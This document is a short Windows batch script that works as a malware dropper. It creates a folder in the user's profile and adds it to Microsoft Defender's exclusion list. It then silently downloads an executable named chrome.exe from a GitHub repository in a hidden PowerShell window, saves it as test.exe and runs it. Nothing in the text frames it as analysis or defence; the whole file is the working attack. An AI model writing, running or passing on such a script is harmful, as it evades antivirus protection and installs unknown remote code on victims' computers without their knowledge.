@echo off
md %USERPROFILE%\tm
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\tm'
PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/Oliverhansen09/test/raw/main/chrome.exe -OutFile '%USERPROFILE%\tm\test.exe'"
start "" %USERPROFILE%\tm\test.exe